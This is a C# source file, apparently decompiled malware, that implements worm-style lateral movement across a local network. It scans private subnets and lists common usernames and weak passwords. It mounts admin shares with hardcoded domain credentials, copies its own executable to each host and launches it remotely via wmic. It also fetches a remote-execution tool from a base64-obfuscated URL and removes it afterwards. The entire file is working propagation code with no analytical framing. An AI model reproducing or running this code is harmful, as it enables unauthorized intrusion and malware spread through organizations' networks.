using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;

namespace Complex;

internal class NetworkSpreading
{
	public static List<string> lanList = new List<string>();

	public static string MyIP = "";

	public static List<string> names = new List<string>
	{
		"Administrator", "Admin", "Guest", "User", "User1", "user-1", "Test", "root", "buh", "boss",
		"ftp", "rdp", "rdpuser", "rdpadmin", "manager", "support", "work", "other user", "operator", "backup",
		"asus", "ftpuser", "ftpadmin", "nas", "nasuser", "nasadmin", "superuser", "netguest", "alex"
	};

	public static List<string> passes = new List<string>
	{
		"Administrator", "administrator", "Guest", "guest", "User", "user", "Admin", "adminTest", "test", "root",
		"root", "123", "1234", "12345", "123456", "1234567", "12345678", "123456789", "1234567890", "Administrator123",
		"administrator123", "Guest123", "guest123", "User123", "user123", "Admin123", "admin123Test123", "test123", "password", "111111",
		"55555", "77777", "777", "qwe", "qwe123", "qwe321", "qwer", "qwert", "qwerty", "qwerty123",
		"zxc", "zxc123", "zxcv", "uiop", "123321", "321", "love", "secret"
	};

	public static void Run()
	{
		try
		{
			lanList = GetLocalNetwork();
		}
		catch
		{
			return;
		}
		string text = "";
		if (lanList.Count > 0)
		{
			try
			{
				text = DownloadTool();
			}
			catch
			{
				return;
			}
		}
		try
		{
			if (File.Exists(text))
			{
				foreach (string lan in lanList)
				{
					if (!lan.StartsWith("10.") && !lan.StartsWith("172.16.") && !lan.StartsWith("192.168."))
					{
						continue;
					}
					try
					{
						if (Program.CredActivate == "YES")
						{
							Program.ProcessCommand("net.exe", "use \\\\" + lan + " /USER:EDENFIELD\\efadmin P455w0rd");
							Thread.Sleep(2000);
							File.Copy(Assembly.GetEntryAssembly()!.Location, "\\\\" + lan + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location), overwrite: true);
							if (File.Exists("\\\\" + lan + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)))
							{
								Program.ProcessCommand("wmic.exe", "/node:" + lan + " /user:EDENFIELD\\efadmin /password:P455w0rd process call create cmd.exe /c \\" + lan + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location));
							}
						}
						else
						{
							Program.ProcessCommand("net.exe", "use \\\\" + lan);
							Thread.Sleep(2000);
							File.Copy(Assembly.GetEntryAssembly()!.Location, "\\\\" + lan + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location), overwrite: true);
							if (File.Exists("\\\\" + lan + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)))
							{
								Program.ProcessCommand("wmic.exe", "/node:" + lan + " process call create cmd.exe /c \\\\" + lan + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location));
							}
						}
					}
					catch
					{
					}
					if (Program.CredActivate == "YES")
					{
						Program.ProcessCommand(text, "\\" + lan + " -u EDENFIELD\\efadmin -p P455w0rd -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly()!.Location);
					}
					else
					{
						Program.ProcessCommand(text, "\\" + lan + " -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly()!.Location);
					}
				}
			}
		}
		catch
		{
			return;
		}
		List<IPInfo> iPInfo = IPInfo.GetIPInfo();
		foreach (IPInfo item in iPInfo)
		{
			try
			{
				if (item.IPAddress.StartsWith("10.") || item.IPAddress.StartsWith("172.16.") || item.IPAddress.StartsWith("192.168."))
				{
					WakeOnLan.WakeUp(item.MacAddress, item.IPAddress, "255.255.255.0");
				}
			}
			catch
			{
				return;
			}
		}
		foreach (IPInfo item2 in iPInfo)
		{
			try
			{
				Regex regex = new Regex(".");
				string subnet = regex.Split(item2.IPAddress)[0] + "." + regex.Split(item2.IPAddress)[1] + "." + regex.Split(item2.IPAddress)[2];
				List<string> list = NetScan.scan(subnet);
				foreach (string item3 in list)
				{
					string current = (MyIP = item3);
					foreach (string item4 in list)
					{
						if (!item4.StartsWith("10.") && !item4.StartsWith("172.16.") && !item4.StartsWith("192.168."))
						{
							continue;
						}
						try
						{
							if (Program.CredActivate == "YES")
							{
								Program.ProcessCommand("net.exe", "use \\\\" + item4 + " /USER:EDENFIELD\\efadmin P455w0rd");
								Thread.Sleep(2000);
								File.Copy(Assembly.GetEntryAssembly()!.Location, "\\\\" + item4 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location), overwrite: true);
								if (File.Exists("\\\\" + item4 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)))
								{
									Program.ProcessCommand("wmic.exe", "/node:" + item4 + " /user:EDENFIELD\\efadmin /password:P455w0rd process call create cmd.exe /c \\\\" + item4 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location));
								}
							}
							else
							{
								Program.ProcessCommand("net.exe", "use \\\\" + current);
								Thread.Sleep(2000);
								File.Copy(Assembly.GetEntryAssembly()!.Location, "\\\\" + item4 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location), overwrite: true);
								if (File.Exists("\\\\" + item4 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)))
								{
									Program.ProcessCommand("wmic.exe", "/node:" + item4 + " process call create cmd.exe /c \\\\" + item4 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location));
								}
							}
						}
						catch
						{
						}
						if (Program.CredActivate == "YES")
						{
							Program.ProcessCommand(text, "\\" + item4 + " -u EDENFIELD\\efadmin -p P455w0rd -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly()!.Location);
						}
						else
						{
							Program.ProcessCommand(text, "\\" + item4 + " -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly()!.Location);
						}
					}
				}
			}
			catch
			{
				return;
			}
		}
		if (File.Exists(text))
		{
			File.Delete(text);
		}
	}

	public static List<string> GetLocalNetwork()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == "InterNetwork")
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	public static string DownloadTool()
	{
		if (IntPtr.Size == 8)
		{
			return DownloadFile(new Uri(Program.Base64Decode("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
		}
		return DownloadFile(new Uri(Program.Base64Decode("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
	}

	public static string DownloadFile(Uri Url)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(Url, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}
}
